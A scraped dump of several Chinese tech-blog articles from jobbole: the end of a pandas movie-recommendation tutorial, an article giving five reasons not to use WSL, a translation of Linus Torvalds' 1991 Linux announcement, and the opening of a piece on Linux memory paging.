class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsimCandidates = simCandidates.groupby(simCandidates.index).sum()\r\nsimCandidates.sort_values(inplace = True, ascending = False)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b625449e0010014782982-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625449e0010014782982-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b625449e0010014782982-1\"><span class=\"crayon-v\">simCandidates</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">simCandidates</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">groupby</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">simCandidates</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">sum</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625449e0010014782982-2\"><span class=\"crayon-v\">simCandidates</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">sort_values</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">inplace</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">True</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ascending</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">False</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p>4.只保留用户没有看过的电影</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b625449e0014951844428\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfilteredSims = simCandidates.drop(myRatings.index)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b625449e0014951844428-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b625449e0014951844428-1\"><span class=\"crayon-v\">filteredSims</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">simCandidates</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">drop</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">myRatings</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p></p>\n<h2>如何更进一步？</h2>\n<p>在上面的实例中，Pandas与我们的CPU足以处理MovieLens的数据集。然而，当数据集变得更庞大时，处理的时间也会变得更加漫长。因此，你应该转为使用具有更强大处理能力的解决方案，如Spark或MapReduce。</p>\n<p>我希望我已经成功让你看到，实现一个简单而有效的推荐系统中并没有什么复杂之处。如果你有任何问题，不要犹豫，直接评论就好了。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114167\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114167votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114167\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/q2346410846\">Marticles</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/q2346410846\">\r\n\t\t\t<img src=\"http://q.qlogo.cn/qqapp/208656/6D3A7551E1BB7FD4B870CD034C2353ED/100\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            Just for fun.        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/q2346410846\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/q2346410846/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/q2346410846/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 11</a>        </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/a1c098d53f6a2f9782a4c4f516aeb6dda3aab6a2.jpg"},{"url_object_id": "48727ed61f8a464829dd46ddc8c7e081", "title": ["什么情况下不应该使用 Windows Linux 子系统"], "url": "http://blog.jobbole.com/114221/", "create_date": "2018/07/23", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/11/1d34dd467641215c527e32ede94fe494.jpg"], "praise_nums": "1", "comment_nums": 0, "fav_nums": 0, "tags": "IT技术, Linux, WSL", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://virtualizationreview.com/articles/2018/07/17/reasons-to-not-use-WSL.aspx\">Tom Fenton</a>   译文出处：<a target=\"_blank\" href=\"\">W.B.</a>   </div><p>在我上个月的专栏文章中，我讨论了应该使用Windows Linux子系统（Windows Subsystem for Linux，WSL）的原因，该系统允许你在Windows 10和Windows 2016上运行Linux发行版。不过，仅仅因为你能够做什么并不意味这你应该这么做。相比于先前的文章着眼于勾勒WSL的好处，在此我会站在相反的角度讲述五个不应运行WSL的原因。</p>\n<h3>原因1</h3>\n<p>微软并未基于生产环境负载设计或构建WSL。如果你的应用或作业流程需要达到特定服务水平协议，那么不要将其运行在WSL之上。</p>\n<h3>原因2</h3>\n<p>运行一个虚拟机可能会更有效。WSL是一个超棒的工具，但是如果你需要Linux系统的全部能力和特性，最好还是在一个虚拟机上运行Linux实例。许多公司提供免费版本的Type 2 Hypervisor，它们可以很好地运行在Windows系统上。如果你确实想要获得完整的Linux体验，就在Vmware Player、Oracle Virtualbox、Microsoft Hyper-v或者其他Hypervisor上将Linux作为虚拟机运行。</p>\n<h3>原因3</h3>\n<p>WSL缺乏可靠的图形界面。在另一篇文章中，我向大家演示了如何配置WSL与图形子系统协同工作。经过一番尝试之后，我可以让一些图形化程序跑起来，但是还有其他程序令我无能为力。因为让WSL与图形化子系统交互并没有包含在微软的设计目标内。如果你需要一个可靠的图形界面，不要在WSL运行它。</p>\n<h3>原因4</h3>\n<p>WSL上的联网并不完全可靠。WSL允许你进行网络通信，但是这可能并不是最佳的实现途径，因为它要穿透几层才能生效。WSL的早期版本对于通过命令行实现联网存在一些限制。尽管事实上WSL已经以难以置信的速度变得成熟稳定，Windows和Linux的联网协议栈却已历经数十年的优化，因此我觉得WSL的联网变得完全可靠还需假以时日。</p>\n<h3>原因5</h3>\n<p>WSL免费，但未必成本最低。直觉告诉我很多人会让WSL发挥超越其设计目的的作用，这会让他们投入比替代的付费方案更多的资源。使用正确的工具完成任务永远是最佳的问题解决之道。</p>\n<h3>最终观点</h3>\n<p>总之，不要买了雨伞就盼着下雨。WSL是一个值得拥有的优秀工具，可以很方便地用于非生产负载环境和快速简单的任务，但是它并非设计用于生产环境；恰如其分地使用它，而不是拿鸡毛当令箭。</p>\n<h3>译者简介</h3>\n<p>武斌，1984 年生，男，自由职业，做过网络管理、计算机图书编辑等工作，喜欢技术，对 IT 行业知识涉猎广泛。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114221\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114221votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114221\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/11a48b07810c909fd0ce4f50b3b33355d43f04e2.jpg"},{"url_object_id": "d6ec0ef3593f6a22382ac914afc4a27a", "title": ["Linus 定义 Linux"], "url": "http://blog.jobbole.com/114208/", "create_date": "2018/07/09", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2014/03/5215e39e39eb546d1689aa26f8d633be.jpg"], "praise_nums": "1", "comment_nums": 2, "fav_nums": 2, "tags": "IT技术, Linux", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"http://oldlinux.org/Linus/\">Linus Torvalds</a>   译文出处：<a target=\"_blank\" href=\"https://www.oschina.net/translate/linux-a-free-unix-386-kernel\">开源中国</a>   </div><h1>LINUX介绍</h1>\n<h2>LINUX是什么？</h2>\n<p>LINUX是一个免费类unix内核，适用于386-AT计算机，附带完整源代码。主要让黑客、计算机科学学生使用，学习和享受。它大部分用C编写，但是一小部分是用gnu格式汇编，而且引导序列用的是因特尔086汇编语言。C代码是相对ANSI的，使用一些GNU增强特性（大多为 __asm__ 和 inline）。</p>\n<p>然而有很多可用于386电脑的unices，他们大部分要花很多钱，而且不附带源码。因此他们是使用计算机的理想选择，但是如果你想了解他们如何工作，那是不可能的。</p>\n<p>也有一些  Unix 是附带源码的。Minix，Andrew S. Tanenbaum编写的学习工具，已经在大学中作为教学工具使用了很多年了。BSD-386系统是附带源码的，但是有版权限制，而且要花很多钱（我记得起始价格为$995）。GNU内核（Hurd）将会是免费的，但是现在还没有准备好，而且对于了解和学习它们来说有点庞大。</p>\n<p>LINUX与Minix是最相似的，由于它很小而且不是非常复杂，因此易于理解（嗯…）。LINUX是基于Minix编写的，因此有相当多的相同点，任何Minix黑客在使用LINUX的时候都感觉非常熟悉。不过，没有在项目中使用Minix代码，因此Minix版权没有限制到这个新系统。它也是完全免费的，而且它的版权非常宽松。因此不像使用Minix，它不需要几兆字节大小的区别。</p>\n<h2>LINUX版权</h2>\n<p>虽然是免费的发布版，我还是从以下几个方面限制了LINUX的使用：</p>\n<ul>\n<li>你可以自由复制和重新发布源码和二进制，只要是：</li>\n</ul>\n<ol>\n<li>完全开源。因此不能单独发布二进制，即使你只修改了一点。</li>\n<li>你不能从发布版获取利益。事实上甚至“装卸费用”都是不被接受的。</li>\n<li>你要保持完整的适当版权。</li>\n</ol>\n<ul>\n<li>根据需要你可能会修改源码，但是如果你发布了新系统的一部分（或者只有二进制），必须将新的代码包含进去。</li>\n<li>除了不包含版权的代码之外，你可能会做一些小的修改。这由你来定，但是如果能将相关内容或者代码告诉我，将不胜感激。</li>\n</ul>\n<p>对任何使用或者扩展系统的人来说，这应该足够宽松而不会引起任何担忧。如果你有朋友真的不想要源码，只想要一个能运行的二进制，你当然可以给他而不用担心我会起诉你。不过最好只在朋友之间这么做。</p>\n<h2>LINUX运行所需的硬件/软件</h2>\n<p>LINUX是在一个运行Minix的386-AT上开发的。由于LINUX是一个真正的操作系统，而且需要直接与硬件交互来做一些事情，你必须有一个非常相似的系统来让他顺利运行：</p>\n<ul>\n<li>386-AT（PS/2之类是不同的，不能正常运行）</li>\n<li>VGA或者EGA屏幕硬件。</li>\n<li>标准AT硬盘接口，IDE盘可以运行（实际上我用的就是这个）。</li>\n<li>正常实模式BIOS。一些机器看起来是用虚-86模式运行启动程序，而且在这样的机器LINUX不会启动和正常运行。</li>\n</ul>\n<p>LINUX会发展成为一个自给自足的系统，现在需要Minix-386才能正常运行。你需要Minix让初始化启动文件系统，和编译OS二进制。在那之后LINUX是一个自给自足的系统，但是为了做文件系统检查（fsck）和修改之后重编译系统，推荐使用Minix。</p>\n<h2>获取LINUX</h2>\n<p>LINUX现在可以使用匿名ftp从‘nic.funet.fi’的‘/pub/OS/Linux’目录获取。这个目录包含操作系统的所有源码，还有一些二进制文件，因此你可以真正使用系统了。</p>\n<p><strong>注意！二进制大多是GNU软件，而且版权比LINUX的严格（GNU非盈利性版权）。因此你不能在不发布他们源码的情况下重新发布他们，可以在/pub/GNU中找到。关于GNU非盈利性版权，从任何GNU软件包了解更多。</strong></p>\n<p>此目录中各类文件如下：</p>\n<ul>\n<li>linux-0.03.tar.Z–系统的完全源码，16位tar压缩文件格式。</li>\n<li>Linux.tex–这个文件的LATEX源码。</li>\n<li>bash.Z–在LINUX下运行的bash二进制文件。这个二进制文件应该放到预留给LINUX文件系统中的/bin/sh下（参见installation）。</li>\n<li>update.Z–更新二进制文件，要放到/bin/update。</li>\n<li>gccbin.tar.Z–GNU cc二进制文件需要由一个可运行的编译器。这个tar压缩包含有编译器，加载器，汇编程序和支持程序（nm，strip等）。它还包含一个小型的库，可用于大部分程序。</li>\n<li>include.tar.Z–让gcc运行的必要include文件。</li>\n<li>unistd.tar.Z–unistd库程序的源码（即系统调用接口）。通过这个你可以使用系统独立库源码编译一个大一些的库。</li>\n<li>utilbin.tar.Z–各种GNU工具的二进制文件，包括GNU的fileutils，make和tar。也包含克隆emacs的uemacs。</li>\n<li>README, RELNOTES-0.01, INSTALLATION–包含一些（有点过时的）LINUX相关的信息的ascii文件。</li>\n</ul>\n<p>让系统运行的最少文件是OS源码和bash和更新二进制文件。不过只用这些，你做不了什么事。</p>\n<h2>安装</h2>\n<p>在你拿到了必要LINUX文件之后，你需要编译系统和创建root目录。必要的二进制文件需要放到root文件系统中。按如下操作：<br>\n1. 备份你的软件。虽然LINUX从没有毁坏过我的任何文件，但没有什么是必然的。安全胜过遗憾。<br>\n2. 选择/创建一个标准MinixHD-分区作为新的LINUX root文件系统。<br>\n3. 在新的root创建必要的设备节点。LINUX与Minix使用相同类型的节点，所以使用Minix的mknod命令创建下面的设备：节点号与在Minix中相同。</p>\n<ul>\n<li>/dev/tty</li>\n<li>/dev/tty[0-2]</li>\n<li>/dev/hd[0-9]</li>\n</ul>\n<p>4. 将必要文件放到新的root分区。文件应该放在下面目录中：<br>\n希望你现在有一个功能正常的unix，而且你已经root权限登录。LINUX现在没有‘init’过程，只要你注销，系统会同步并等待。使用三指键（Ctrl+Alt+Del）重启机器。</p>\n<ul>\n<li>gcc</li>\n<li>添加链接到你选择的/usr/local/lib中的文件。我将ld，as，nm，strip和size链接到他们相应的 /usr/local/lib/gcc-XXX。</li>\n<li>gccbin.tar.Z中的内容，除了gcc</li>\n<li>include.tar.Z的内容</li>\n<li>utilbin.tar.Z的内容</li>\n<li>sh，即bash.Z</li>\n<li>update</li>\n<li>/bin:</li>\n<li>/usr/bin:</li>\n<li>/usr/include:</li>\n<li>/usr/local/lib:</li>\n<li>/usr/local/bin:</li>\n<li>编辑系统中的linux/include/linux/config.h。这个文件包含了针对于系统的信息：内存空间，硬盘类型，root分区号（同样的与Minix中的编号相同），键盘类型（现在只有US和Finnish）等。</li>\n<li>编译LINUX源码。一个简单技巧就可以完成，在你编辑makefiles为适合你的系统之后（即，删除-mstring-insnsflag，和修改适合你的路径。）1.40之前版本gcc的用户可能需要添加gnulib到makefile中‘LIBS=’一行。</li>\n<li>复制产生的镜像文件到软盘（即，cp Image /dev/PS0 或者之类的）。</li>\n<li>使用新的软盘重启。启动界面应该告诉你系统正在启动（加载系统…），然后是一些必要的文件系统信息（xxx/XXX inodes/blocks free），接下来是一个确定，还有bash提示（如果你没有.bashrc文件，则初始化bash#）。</li>\n</ul>\n<p><strong>LINUX 缺失/不兼容的东西</strong></p>\n<p>LINUX 是打算作为一个全部自给自足的内核，但现在并非如此。作为上面已经提到的，你需要 Minix 来设置启动设备并且检查文件系统当它运行起来的时候。这里有一些其它的不足之处：</p>\n<p>硬件的不兼容。一些 AT 标准特性当前还没有支持。最值得注意的是软盘驱动，利用 LINUX 进行实际工作（备份 etc）当前是不可能的[译者：这个是 oldlinux，这个是 Linus Torvalds 1991 年 10 月写的文章，肯定当时是不行的]。还有串行连接的一些特性没有被实现（2400 bps 波特率的硬连接，没有挂断（hang-up）提示等等 ）。</p>\n<p>标准 c 库的不兼容。gcc 分发版的 libc.a 没有完成，我对免费可发布的库功能很感兴趣。</p>\n<p>一些系统调用没有完全实现。这些设计绝大多数“极少调用”的特性比如调试（谁无论如何需要它的话，你的程序第一次是无法工作的:-)）以及其它的特性。</p>\n<p>如上所述，没有登陆和初始化进程。当前 LINUX 启动在单用户模式，以 root 作为控制台用户。对于一些移植工作足够了，但不是实际可用的。</p>\n<p>387支持[译者：硬件浮点，当时 Intel 发布了外接式 FPU] 没有被实现，即使已有一些基础程序被提供出来。”nic.funet.fi” 的 gcc 二进制包使用软浮点（ie 仿真功能调用）来支持 4 个基础数学运算操作。387-支持将尽快实现当我的电脑安装了这个硬件。希望在一个月或者两个月。</p>\n<p>现在还没有重要的系统管理命令实现在 LINUX 中。这些包括 mkfs, format, fsck, mknod 等。这些命令需要的内核特性还没有实现（format, mknod），一些命令只需要实现它。作为一个库，我欢迎任何免费分发文件。</p>\n<p>如您所见，LINUX还不是一个完整的系统。 感谢您的帮助，使其变得更好。 我对为LINUX重写的Minix命令不感兴趣，除非你自己从头开始编写它们。 您当然可以免费（并鼓励）将您的Minix发行版中的所有内容用于您自己的LINUX系统，但由于Minix的版权，它们无法分发给更广泛的受众。</p>\n<p>这里提到的一些问题将由我（即lines/387/floppy支持）尽快修复，但我希望得到库函数的支持。感谢你们提交的错误报告及补丁还有愿望清单，如果你真的有针对问题的补丁，我会立即尝试去修复它。 小的更改将作为补丁形式发送到邮件列表，并在<code>nic.funet.fi'上设置，如果经过大量重写，或者修复大的补丁，整个系统将在</code>nic.funet.fi’更新。</p>\n<h2>LINUX移植软件</h2>\n<p>LINUX被设计得让移植相对容易。因此，就有了完整的termios实现和一些POSIX库。我所移植的（诚然相对较少）程序没有任何问题。</p>\n<p>尽管LINUX与Minix非常相似，但Minix程序通常并不会比为其他nuix设计的程序更容易移植。因此，我不建议从一个特定程序的Minix版本开始，而应该尝试从头开始移植‘’virgin‘’程序。比BSD更接近SYSV，这意味着当给定一个-DUSG或者-DSYSV标识时，大多数程序很容易移植。</p>\n<p>移植过程中最困难的一点就是缺少库函数。这些必须由你来编写，或者从其他的来源复制（Minix可能是个有缘人）。另外，一些程序（特别是GNU）有各种各样的标识，这些标识可以定义哪些函数不可用（一旦在Makefile中添加了足够量的-DXXX_MISSING标识，GNU fileutils将编译的很好）。</p>\n<h2>已经移植的程序</h2>\n<p>下面这些程序已经移植到LINUX：</p>\n<ul>\n<li>GNU cc (gcc, cc1, cpp)</li>\n<li>GNU assembler (as386)</li>\n<li>GNU binutils (ld, ar, nm, size, strip, ranlib)</li>\n<li>GNU compress (16-bit)</li>\n<li>GNU tar</li>\n<li>GNU make</li>\n<li>GNU bash (Bourne Again SHell)</li>\n<li>GNU sed</li>\n<li>GNU bison (yacc-lookalike)</li>\n<li>GNU awk</li>\n<li>GNU fileutils (ls, cp, rm, mkdir, rmdir, tail etc)</li>\n<li>less</li>\n<li>uemacs</li>\n</ul>\n<p>所有上述程序都能在‘nic.funet.fi’(主要在’/pub/gnu’)中找到，大多数LIINUX-binaries都可以在‘/pub/OS/Linux’目录中找到。包括gcc（cc1）有一些我自己增强的功能，所有这些程序都在没有变化的情况下编译的。先尝试自己编译，遇到问题可以将差异或者资源发邮件给我。</p>\n<p>另外，我提起过明确地GNU差异编译和运行。</p>\n<h2>技术帮助</h2>\n<p>LINUX目前有一个邮件列表，您可以通过邮件发送到这个地址订阅：<a href=\"mailto:Linux-activists-request@niksula.hut.fi\" rel=\"nofollow\"><strong>Linux-activists-request@niksula.hut.fi</strong></a> ，并要求包括在列表中。然后你可以通过这个邮箱：<a href=\"mailto:Linux-activists@niksula.hut.fi\" rel=\"nofollow\"><strong>Linux-activists@niksula.hut.fi</strong></a> 提问题，这将复制你的问题/答案/无论什么，并发送给列表中其他所有人。</p>\n<p>请注意Linux-activists和Linux0activists-request的不同——第一个用于给列表中的所有人发送邮件，第二个仅用于订阅和取消订阅。</p>\n<p>当然，您也可以直接发送邮件至 <a href=\"mailto:torvalds@kruuna.helsinki.fi\" rel=\"nofollow\"><strong>torvalds@kruuna.helsinki.fi</strong></a>。我会尽量在一两天内回答所有的问题。</p>\n<p>尽管‘nic.funet.fi’可能会保持合理的更新状态，但是它还有些问题（即，我无法因为个人得到文件，但可以通过几个人）。因此，如果邮件列表上的人想要补丁或二进制文件，他们将会更快得到。</p>\n<h2>感谢</h2>\n<p>我要感谢学院…</p>\n<p>说真的，如果没有其他人的帮助，这个系统将永远不会有曙光，甚至会变得更糟。Bruce Evans 帮助我找到了需要更改的位置，以便gcc能正确地处理浮点数，并提供许多有用的想法/建议（他的Minix-386用于构建系统）。此外，Earl Chew 的estdio包被用于标准的IO库。像这样更自由地分发包！</p>\n<p>Alain W Black和Richard Tobin为Minix制作了gcc，没有它我就无法编译这个东西。GNU完成了我在Linux下使用的大部分程序。Alfred Leung发送了美国键盘补丁。</p>\n<p>附：“感谢”<a href=\"mailto:wirzeniu@kruuna.helsinki.fi\" rel=\"nofollow\">wirzeniu@kruuna.helsinki.fi</a>他的“建设性”批评和“诙谐”的评论。他是我第一个<img src=\"http://jbcdn2.b0.upaiyun.com/2018/07/412f23f15ba46a043bbcb30c697e34f7.png\" alt=\"$alpha$\" width=\"14\" height=\"14\">-测试者，他应该被授予勇气奖章。</p>\n<p><strong>Linus Torvalds </strong>(<strong>torvalds@kruuna.helsinki.fi</strong>)<strong>  1991</strong>年<strong>10</strong>月<strong>10</strong>日</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114208\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114208votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114208\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 2 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/e0ca2411e7d10c43fe25ebc0a22960c9b956bd19.jpg"},{"url_object_id": "341703d9c514b0daa1ffc80fbe447cf0", "title": ["Linux 的内存分页管理"], "url": "http://blog.jobbole.com/114225/", "create_date": "2018/07/24", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/1b8322e1daff605d71fc81e724421f17.jpg"], "praise_nums": "1", "comment_nums": 0, "fav_nums": 1, "tags": "IT技术, Linux", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://www.cnblogs.com/vamei/p/9329278.html\">Vamei</a>   </div><p>内存是计算机的主存储器。内存为进程开辟出进程空间，让进程在其中保存数据。我将从内存的物理特性出发，深入到内存管理的细节，特别是了解虚拟内存和内存分页的概念。</p>\n<h3>内存</h3>\n<p>简单地说，内存就是一个数据货架。内存有一个最小的存储单位，大多数都是一个字节。内存用内存地址（memory address）来为每个字节的数据顺序编号。因此，内存地址说明了数据在内存中的位置。内存地址从0开始，每次增加1。这种线性增加的存储器地址称为线性地址（linear address）。为了方便，我们用十六进制数来表示内存地址，比如0x00000003、0x1A010CB0。这里的“0x”用来表示十六进制。“0x”后面跟着的，就是作为内存地址的十六进制数。</p>\n<p>内存地址的编号有上限。地址空间的范围和地址总线（address bus）的位数直接相关。CPU通过地址总线来向内存说明想要存取数据的地址。以英特尔32位的80386型CPU为例，这款CPU有32个针脚可以传输地址信息。每个针脚对应了一位。如果针脚上是高电压，那么这一位是1。如果是低电压，那么这一位是0。32位的电压高低信息通过地址总线传到内存的32个针脚，内存就能把电压高低信息转换成32位的二进制数，从而知道CPU想要的是哪个位置的数据。用十六进制表示，32位地址空间就是从0x00000000 到0xFFFFFFFF。</p>\n<p>内存的存储单元采用了随机读取存储器（RAM， Random Access 